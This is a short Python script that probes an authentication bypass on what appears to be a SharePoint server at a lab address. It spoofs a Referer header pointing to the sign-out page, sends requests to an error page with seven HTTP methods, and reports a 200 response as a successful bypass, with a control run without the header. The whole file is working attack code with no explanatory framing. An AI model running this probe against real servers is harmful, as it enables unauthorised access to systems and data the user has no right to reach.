# Test HTTP method variations with auth bypass
# Purpose: Check if bypass works with different HTTP methods

import requests

base_url = "http://10.10.10.166"
test_endpoint = "/_layouts/15/Error.aspx"
test_body = "test=data"

headers_bypass = {
    "Referer": "/_layouts/SignOut.aspx",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

headers_no_bypass = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Test different HTTP methods
methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]

print("=" * 60)
print("Testing HTTP Methods WITH bypass (signout referer)")
print("=" * 60)

for method in methods:
    print(f"\n[*] Method: {method}")
    try:
        if method == "GET":
            response = requests.get(f"{base_url}{test_endpoint}", headers=headers_bypass, timeout=10)
        elif method == "POST":
            response = requests.post(f"{base_url}{test_endpoint}", headers=headers_bypass, data=test_body, timeout=10)
        elif method == "PUT":
            response = requests.put(f"{base_url}{test_endpoint}", headers=headers_bypass, data=test_body, timeout=10)
        elif method == "DELETE":
            response = requests.delete(f"{base_url}{test_endpoint}", headers=headers_bypass, timeout=10)
        elif method == "HEAD":
            response = requests.head(f"{base_url}{test_endpoint}", headers=headers_bypass, timeout=10)
        elif method == "OPTIONS":
            response = requests.options(f"{base_url}{test_endpoint}", headers=headers_bypass, timeout=10)
        elif method == "PATCH":
            response = requests.patch(f"{base_url}{test_endpoint}", headers=headers_bypass, data=test_body, timeout=10)
        
        print(f"    Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    *** BYPASS SUCCESSFUL ***")
        elif response.status_code == 401:
            print(f"    Result: BLOCKED (auth required)")
        else:
            print(f"    Result: {response.reason}")
    except Exception as e:
        print(f"    Error: {e}")

print("\n" + "=" * 60)
print("Testing HTTP Methods WITHOUT bypass (control)")
print("=" * 60)

for method in ["GET", "POST"]:
    print(f"\n[*] Method: {method} (no bypass)")
    try:
        if method == "GET":
            response = requests.get(f"{base_url}{test_endpoint}", headers=headers_no_bypass, timeout=10)
        elif method == "POST":
            response = requests.post(f"{base_url}{test_endpoint}", headers=headers_no_bypass, data=test_body, timeout=10)
        
        print(f"    Status: {response.status_code}")
    except Exception as e:
        print(f"    Error: {e}")
